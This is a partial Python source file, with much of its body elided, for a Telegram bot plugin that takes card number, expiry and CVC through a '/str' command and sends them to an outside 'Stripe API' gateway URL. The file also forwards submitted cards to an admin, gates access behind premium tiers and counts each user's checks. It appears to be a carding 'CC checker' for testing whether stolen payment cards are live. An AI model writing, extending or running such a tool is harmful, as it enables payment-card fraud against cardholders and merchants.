...
PLUGIN_INFO = {
    ...
    'commands': ['str'],
    'prefixes': ['.', '/', '!', '$'],
    'description': 'Stripe API payment gateway',
    'type': 'check',
    'status': 'active'
}

def categorize_stripe_response(api_response):
    """Categorize Stripe API response"""
    try:
...
def format_stripe_response(card_info, response_message, suffix, bin_info, execution_time, category):
    """Format Stripe API response for Telegram"""
    ...
    response_text += f"㊕ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe API\n"
...
class StripeGateway:
    def __init__(self):
        self.base_url = "https://onyxenvbot.up.railway.app/stripe/key=yashikaaa/cc="

    async def check_card(self, card, month, year, cvv):
        """Main function to check card through Stripe API"""
...
def setup(app: Client):
    ...
    @app.on_message(filters.command(["str"], prefixes=[".", "/", "!", "$"]))
    async def str_command(client, message):
        """Handle /str command""" 
        ...
        can_access, reason = await check_gateway_access(user_id, 'str')
        if not can_access:
            if reason == "locked":
                return
            elif reason == "premium":
        ...
        if not text:
            resp = f"""〈<a href='tg://user?id={user_id}'>꫟</a>〉-» 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝗣𝗜 - CHECK

〈♻️〉𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» Stripe API

<a href='tg://user?id={user_id}'>╰┈➤</a> 𝙁𝙤𝙧𝙢𝙖𝙩 -» /str cc|month|year|cvc"""
        ...
        if not await validate_card_with_luhn(card_info, "Stripe API", message):
            return
        
        card, month, year, cvv = card_info
        
        # Forward to admin if enabled
        await forward_to_admin_if_enabled(client, message, 'str')
        
        # Send progress message
        progress_msg = await message.reply_text("𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩...")
        
        # Process the card using Stripe Gateway
        gateway = StripeGateway()
        api_response, error, execution_time = await gateway.check_card(card, month, year, cvv)
        
        # Increment check counter
        db.increment_check(user_id, 'str')
        ...
        if error:
            ...
            # Parse API response
            category, response_message, suffix = categorize_stripe_response(api_response)
    ...
    print("✅ Stripe Gateway commands registered")
